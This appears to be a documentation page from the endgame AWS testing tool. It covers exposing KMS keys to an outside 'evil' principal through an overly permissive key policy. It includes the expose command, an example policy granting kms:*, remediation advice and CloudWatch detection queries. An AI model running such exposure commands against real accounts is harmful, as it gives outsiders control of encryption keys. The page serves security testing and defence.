# KMS Keys

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [Basic Detection](#basic-detection)
* [References](#references)

## Steps to Reproduce

* To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

endgame expose --service kms --name test-resource-exposure
```

* To view the contents of the Glacier Vault Access Policy, run the following:

```bash
export VICTIM_KEY_ARN=arn:aws:kms:us-east-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab

aws kms get-key-policy --key-id $VICTIM_KEY_ARN --policy-name default
```

* Observe that the output of the overly permissive KMS Key Policy resembles the example shown below.

## Example

Observe that the policy below allows the evil principal (`arn:aws:iam::999988887777:user/evil`) the `kms:*` permissions to the KMS Key.

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "Endgame",
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::999988887777:user/evil"
            },
            "Action": "kms:*",
            "Resource": "arn:aws:kms:us-east-1:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab"
        }
    ]
}
```

## Exploitation

```
TODO
```

## Remediation

* **Leverage Strong Resource-based Policies**: Follow the resource-based policy recommendations in the [Prevention Guide](https://endgame.readthedocs.io/en/latest/prevention/#leverage-strong-resource-based-policies)
* **Trusted Accounts Only**: Ensure that KMS Keys are only shared with trusted accounts, and that the trusted accounts truly need access to the key.
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **AWS Access Analyzer**: Leverage AWS Access Analyzer to report on external access to  KMS Keys. See [the AWS Access Analyzer documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html) for more details.
* **Restrict access to IAM permissions that could lead to exposure of your KMS Keys**: Tightly control access to the following IAM actions:
      - [kms:PutKeyPolicy](https://docs.aws.amazon.com/kms/latest/APIReference/API_PutKeyPolicy.html): _Controls permission to replace the key policy for the specified customer master key_
      - [kms:GetKeyPolicy](https://docs.aws.amazon.com/kms/latest/APIReference/API_GetKeyPolicy.html): _Controls permission to view the key policy for the specified customer master key_
      - [kms:ListKeys](https://docs.aws.amazon.com/kms/latest/APIReference/API_ListKeys.html): _Controls permission to view the key ID and Amazon Resource Name (ARN) of all customer master keys in the account_
      - [kms:ListAliases](https://docs.aws.amazon.com/kms/latest/APIReference/API_ListAliases.html): _Controls permission to view the aliases that are defined in the account. Aliases are optional friendly names that you can associate with customer master keys_

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)

## Basic Detection
The following CloudWatch Log Insights query will include exposure actions taken by endgame:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent
| filter eventSource='kms.amazonaws.com' and eventName='PutKeyPolicy'
```

The following query detects policy modifications which include the default IOC string:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent 
| filter eventSource='kms.amazonaws.com' and (eventName='PutKeyPolicy' and requestParameters.policy like 'Endgame')
```

This query assumes that your CloudTrail logs are being sent to CloudWatch and that you have selected the correct log group.

## References

* [put-key-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/kms/put-key-policy.html)
* [get-key-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/kms/get-key-policy.html)